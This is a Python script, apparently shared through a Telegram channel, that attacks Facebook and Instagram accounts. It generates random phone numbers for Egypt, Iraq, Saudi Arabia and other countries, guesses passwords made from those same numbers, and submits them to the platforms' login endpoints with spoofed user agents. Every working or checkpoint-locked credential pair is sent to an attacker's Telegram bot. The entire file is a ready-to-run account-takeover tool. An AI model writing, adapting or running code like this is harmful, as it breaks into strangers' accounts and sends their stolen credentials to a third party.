# - CODE - PY_TELEGRAM : @B_5_U 
import requests , random , os , sys , pyfiglet , time , webbrowser , user_agent
from user_agent import generate_user_agent
from uuid import uuid4
# ┅  ┅  ┅  ┅  ┅  ┅  ┅  ┅
S = "\033[1;91m"  #احمر
Y = "\033[1;34m" #ازرق فاتح
Z1 = "\033[2;31m"  #احمر ثان
C = "\033[1;97m" #ابيض
B = "\033[1;90m"  #اسود فاتح
C = "\033[1;97m"  #ابيض
E = "\033[1;92m"  #اخضر
H = "\033[1;93m"  #اصفر
K = "\033[1;94m"  #ازرق
L = "\033[1;95m"  #ارجواني
# ┅  ┅  ┅  ┅  ┅  ┅  ┅  ┅
Qs = B+'-'*44 ; SsS = B+'-'*28
L = ' : '
Hh = 0
Sc = 0
Bb = 0
scr = 'SECURE : ' ; badd = 'BAD : ' ; hkk = 'HACK : ' ; sarRot = '0123456789'
#--------------#
Myy = B+pyfiglet.figlet_format(f'/ SAROT \\')
LogO = f'''{Qs}
{S}({E}1{S}){H}➥ {E}FACEBOOK\t\t  {S}({E}3{S}){H}➥ {E}PY:TELEGRAM
{S}({E}2{S}){H}➥ {E}INSTAGRAM\t\t  {S}({E}4{S}){H}➥ {E}EXIT 
{Qs}\n'''
def SAROTT(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(4./990)
SAROTT(B+Myy+'                 PY : B_5_U\n'+LogO)
#--------------#
SaroTq = int(input(f'{S}({E}?{S}) {B}CHOOSE {E}›› '))
if SaroTq == 3:
	webbrowser.open('https://t.me/B_5_U')
	exit('\nPY : @B_5_U')
if SaroTq == 4:
	os.system('clear')
	exit()
ID = input (f'\n{S}({E}?{S}) {H}ID TELEGRAM{E}›› ')
token = input (f'\n{S}({E}?{S}) {H}TOKEN TELEGRAM{E}›› ')
if SaroTq == 1:
	os.system('clear')
	logq = B+pyfiglet.figlet_format(f'/ F B \\')
	Qsar = f'''{SsS}
{S}({E}A{S}){H}➥ {E}EGYPT\t\t 🇪🇬
{S}({E}B{S}){H}➥ {E}IRAQ\t\t 🇮🇶
{S}({E}C{S}){H}➥ {E}IRAN\t\t 🇮🇷
{S}({E}D{S}){H}➥ {E}QATAR\t\t 🇶🇦
{S}({E}E{S}){H}➥ {E}TUNIS\t\t 🇹🇳
{S}({E}F{S}){H}➥ {E}MOROCCO\t\t 🇲🇦
{S}({E}G{S}){H}➥ {E}LIBYA\t\t 🇱🇾
{S}({E}J{S}){H}➥ {E}ALGERIA\t\t 🇩🇿
{S}({E}L{S}){H}➥ {E}SAUDI ARABIA\t 🇸🇦
{SsS}'''
# - CODE - PY_TELEGRAM : @B_5_U 
	SAROTT(logq+Qsar)
	count = str(input(f'\n{S}({E}?{S}) {H}COUNTRY {E}›› '))
	print(' ')
	while True:
		if count == 'A':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			email = '+2010' + Saroty
			pas = '010' + Saroty
		if count == 'B':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			email = '+96477' + Saroty
			pas = '077' + Saroty
		if count == 'C':
			Saroty = str(''.join((random.choice(sarRot) for i in range(7))))
			email = '+98936' + Saroty
			pas = '0936' + Saroty
		if count == 'D':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			email = '+9733' + Saroty
			pas = '3' + Saroty
		if count == 'E':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			email = '+2166' + Saroty
			pas = '06' + Saroty
		if count == 'F':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			email = '+20126' + Saroty
			pas = '06' + Saroty
		if count == 'G':
			Saroty = str(''.join((random.choice(sarRot) for i in range(7))))
			email = '+21891' + Saroty
			pas = '091' + Saroty
		if count == 'J':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			email = '+21366' + Saroty
			pas = '066' + Saroty
		if count == 'L':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			email = '+9665' + Saroty
			pas = '05' + Saroty
		url = 'https://mobile.facebook.com/login.php'
		heade = {
		'User-Agent' : generate_user_agent(),
		'Accept-Language': 'en,ar;q=0.9,en-US;q=0.8,vi;q=0.7'}# - CODE - PY_TELEGRAM : @B_5_U 
		data = {'email': email,'pass': pas}
		reqq = requests.post(url, headers=heade, data=data)
		if "xc_message" in reqq.text:
			Hh =+ 1
			requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 
⌯ 𝙽𝚎𝚠 𝙰𝚌𝚌 ⒻⒷ 
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅
➛⌯ 𝚎𝚖𝚊𝚒𝚕 : {email}

➛⌯ 𝙿𝚊𝚜𝚜 : {pas}
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅
<\> PY : @B_5_U </>''')
			print(E+hkk+email+L+pas)
		elif "checkpointSubmitButton-actual-button" in reqq.text:
			Sc =+ 1
			requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 
⌯ 𝙽𝚎𝚠 𝙰𝚌𝚌 🔒 ⒻⒷ 
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅
➛⌯ 𝚎𝚖𝚊𝚒𝚕 : {email}

➛⌯ 𝙿𝚊𝚜𝚜 : {pas}
 ┅ ┅ ┅ ┅ ┅ ┅ ┅ ┅
<\> PY : @B_5_U </>''')
			print(H+scr+email+L+pas)
		else:
			Bb =+ 1
			print(S+badd+email+L+pas)

# - CODE - PY_TELEGRAM : @B_5_U 
if SaroTq == 2:
	os.system('clear')
	logs = B+pyfiglet.figlet_format(f'/ I G \\')
	SarT = f'''{SsS}
{S}({E}Q{S}){H}➥ {E}EGYPT\t\t 🇪🇬
{S}({E}P{S}){H}➥ {E}IRAQ\t\t 🇮🇶
{S}({E}Y{S}){H}➥ {E}IRAN\t\t 🇮🇷
{S}({E}R{S}){H}➥ {E}QATAR\t\t 🇶🇦
{S}({E}W{S}){H}➥ {E}TUNIS\t\t 🇹🇳
{S}({E}K{S}){H}➥ {E}MOROCCO\t\t 🇲🇦
{S}({E}H{S}){H}➥ {E}LIBYA\t\t 🇱🇾
{S}({E}V{S}){H}➥ {E}ALGERIA\t\t 🇩🇿
{S}({E}X{S}){H}➥ {E}SAUDI ARABIA\t 🇸🇦
{SsS}'''
	SAROTT(logs+SarT)
	count = input (f'\n{S}({E}?{S}) {H}COUNTRY {E}›› ')
	print(' ')
	while True:
		if count == 'Q':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			user = '+2010' + Saroty
			pas = '010' + Saroty
		if count == 'P':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			user = '+96477' + Saroty
			pas = '077' + Saroty
		if count == 'Y':
			Saroty = str(''.join((random.choice(sarRot) for i in range(7))))
			user = '+98936' + Saroty
			pas = '0936' + Saroty
		if count == 'R':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			user = '+9733' + Saroty
			pas = '3' + Saroty
		if count == 'W':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			user = '+2166' + Saroty
			pas = '06' + Saroty
		if count == 'K':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			user = '+20126' + Saroty
			pas = '06' + Saroty
		if count == 'H':
			Saroty = str(''.join((random.choice(sarRot) for i in range(7))))
			user = '+21891' + Saroty
			pas = '091' + Saroty
		if count == 'V':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			user = '+21366' + Saroty
			pas = '066' + Saroty
		if count == 'X':
			Saroty = str(''.join((random.choice(sarRot) for i in range(8))))
			user = '+9665' + Saroty
			pas = '05' + Saroty
			# - CODE - PY_TELEGRAM : @B_5_U 
		url = 'https://b.i.instagram.com/api/v1/accounts/login/'	
		headers = {
'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', #@B_5_U
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'
}
		uid = str((uuid4()))
		data = {
'uuid':uid, 
'password':pas,
'username':user, 
'device_id':uid, 
'from_reg':'false', 
'_csrftoken':'missing', 
'login_attempt_countn':'0'
}

		logen = requests.post(url, headers = headers ,data=data , allow_redirects = True ).text	
		if 'logged_in_user' in logen:
			Hh =+ 1
			print(E+hkk+user+L+pas)
			tl = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ 𝙽𝚎𝚠 𝙰𝚌𝚌 
- - - - - - - - - - - - - - - - - - - - - - - 
⌯ 𝚄𝚜𝚎𝚛 : {user}

⌯ 𝙿𝚊𝚜𝚜 : {pas}
- - - - - - - - - - - - - - - - - - - - - - - 
<\> PY : @B_5_U </>''' )
			i = requests.post(tl)
# - CODE - PY_TELEGRAM : @B_5_U 		
		elif '"message":"challenge_required","challenge"' in logen:
			Sc =+ 1
			print(H+scr+user+L+pas)
			tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=⌯ 𝙽𝚎𝚠 𝙰𝚌𝚌 🔒
- - - - - - - - - - - - - - - - - - - - - - - 
⌯ 𝚄𝚜𝚎𝚛 : {user}

⌯ 𝙿𝚊𝚜𝚜 : {pas}
- - - - - - - - - - - - - - - - - - - - - - - 
<\> PY : @B_5_U </>''' )
			o = requests.post(tlg)
		else:
			print(S+badd+user+L+pas)
			
# - CODE - PY_TELEGRAM : @B_5_U 